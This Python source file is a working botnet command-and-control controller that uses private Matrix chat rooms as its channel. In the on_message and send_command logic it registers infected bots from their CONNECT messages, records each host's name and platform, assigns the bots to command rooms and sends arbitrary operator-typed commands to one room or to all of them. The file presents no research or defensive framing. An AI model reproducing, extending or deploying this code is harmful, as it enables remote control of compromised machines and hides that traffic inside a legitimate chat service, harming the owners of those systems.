import random
from typing import Self
import uuid
from matrix_client.client import MatrixClient, Room
from matrix_client.api import MatrixRequestError
from requests.exceptions import MissingSchema
import os
import sys
from dotenv import load_dotenv
import json
from dataclasses import dataclass

load_dotenv()
USER_NAME = os.getenv('CONTROLLER_NAME')  
PASSWORD = os.getenv('CONTROLLER_PASSWORD')
BOTS_NAME = os.getenv('BOT_NAME')
ANNOUNCE_ROOM_ID = os.getenv('ANNOUNCE_ROOM_ID')
MATRIX_HOMESERVER = "https://matrix.org"


@dataclass
class Bot:
    hostname: str
    platform: str
    platform_version: str
    machine: str
    bot_id: str
    python_version: str
    
    def __init__(self, data: dict):
        self.hostname = data.get("hostname", "UNKNOWN")
        self.platform = data.get("platform", "UNKNOWN")
        self.platform_version = data.get("platform_version", "UNKNOWN")
        self.machine = data.get("machine", "UNKNOWN")
        self.bot_id = data.get("bot_id", "UNKNOWN")
        self.python_version = data.get("python_version", "UNKNOWN")


class CommandRoom:
    bots: dict[str, Bot]
    room: Room
    
    def __init__(self, room):
        self.room = room
        self.bots = {}
        
    def __str__(self):
        return f"{self.bots}"
    
    def add_bot(self, bot_data) -> Bot:
        bot: Bot = Bot(bot_data)
        self.bots[bot.bot_id] = bot
        return bot
    
    def remove_bot(self, bot_id):
        del self.bots[bot_id]
    
    def send_cmd(self, cmd):
        return self.room.send_text(cmd)
        

class BotnetController:
    access_token: str
    announce_room: Room
    command_rooms: dict[str, CommandRoom]
    
    def __init__(self):
        self.device_id = "BOTCONTROLLER"
        self.client = MatrixClient(MATRIX_HOMESERVER)
        self.command_rooms = {}

    def login(self):
        # login and sync
        try:
            self.access_token = self.client.login(username=USER_NAME, password=PASSWORD)
            print("[+] Logged in as controller.")
        except MatrixRequestError as e:
            print(e)
            if e.code == 403:
                print("Bad username or password.")
                sys.exit(4)
            else:
                print("Check your sever details are correct.")
                sys.exit(2)
        except MissingSchema as e:
            print("Bad URL format.")
            print(e)
            sys.exit(3)
            
    def join_room(self, roomid) -> Room:
        try:
            room = self.client.rooms[roomid]
        except KeyError:
            room = self.client.join_room(roomid)
        return room
            
    def sync_rooms(self):
        joined_rooms: dict[str, Room] = self.client.get_rooms()
        for id, room in joined_rooms.items():
            if room.name.startswith("cmd_"):
                self.command_rooms[id] = CommandRoom(room)
            elif room.name == "announcements":
                self.announce_room = self.join_room(ANNOUNCE_ROOM_ID)

    def send_command(self, command, room):
        response = room.send_cmd(f"COMMAND:{command}")
        # TODO: check for successfull response?
        print(f"[+] Sent command: {command}")
        
    def send_to_all(self, command):
        for id, cmd_room in self.command_rooms.items():
            self.send_command(command, cmd_room)
            
    def assign_bot(self, botdata, roomid):
        self.command_rooms[roomid].add_bot(botdata)

    def on_message(self, room, event):
        msgbody: str = event["content"]["body"]
        action, info = msgbody.split(":", 1)
        if action == "CONNECT":
            msgbody = msgbody.removeprefix("CONNECT:")
            msgbody = json.loads(msgbody)
            botid = msgbody["bot_id"]
            # TODO: no room available? -> send RETRY IN: 
            # Uniform distr so should be fine
            room_id = random.choice(list(self.command_rooms.keys()))
            self.announce_room.send_text(
                f"RESOLVE {botid}:{room_id}"
            )
            self.assign_bot(msgbody, room_id)
        elif action == "DISCONNECT":
            room_id, bot_id = info.rsplit(":", 1)
            self.command_rooms[room_id].remove_bot(bot_id)

            
    def create_room(self, name: str) -> Room:
        room: Room = self.client.create_room(name, is_public=False, invitees=[BOTS_NAME])
        room.set_room_name(name)
        return room
    
    def add_command_room(self, name: str):
        new_room = self.create_room(f"cmd_{name}")
        self.command_rooms[new_room.room_id] = CommandRoom(new_room)

    def command_option(self):
        command = input("Command: ")
        all_rooms = input("Would you like to send command to all rooms [Y/n]? ").lower()
        if all_rooms == 'y':
            self.send_to_all(command)
            return
        room_list = list(self.command_rooms.items())
        print("To which room would you like to send a command?")
        for idx, (_, room) in enumerate(room_list):
            print(f"#{idx} | {room.room.name}: {len(room.bots)} bots")
        room_nr = int(input("Choose room number: "))
        if room_nr >= len(room_list):
            print("realy??")
            return
        
        _, room = room_list[room_nr]
        self.send_command(command, room)

        
    def show_state_option(self):
        total_bot_count = 0
        for room_id, room in self.command_rooms.items():
            bot_count = len(room.bots)
            total_bot_count += bot_count
            print(f"Room: {room.room.name}: {bot_count} bots")
        print(f"Total Bots: {total_bot_count}")
        

    def create_room_option(self):
        room_name = input("Room name: ")
        room_name = room_name.replace(" ", "_")
        self.add_command_room(room_name)
        print("[+] room created successfully")

    def run(self):
        self.login()
        self.sync_rooms()
        
        self.announce_room.add_listener(self.on_message)
        self.client.start_listener_thread()
        
        
        print("[+] Controller ready. Enter commands to send to bots.")
        while True:
            print("#1 Send Command")
            print("#2 Show botnet state")
            print("#3 Create Room")
            option = int(input("What would you like to do? "))
            print()
            match option:
                case 1:
                    self.command_option()
                case 2:
                    self.show_state_option()
                case 3:
                    self.create_room_option()
                case _:
                    print("Invalid Option, choose again")

            print("-----------------------------------------")
if __name__ == "__main__":
    controller = BotnetController()
    controller.run()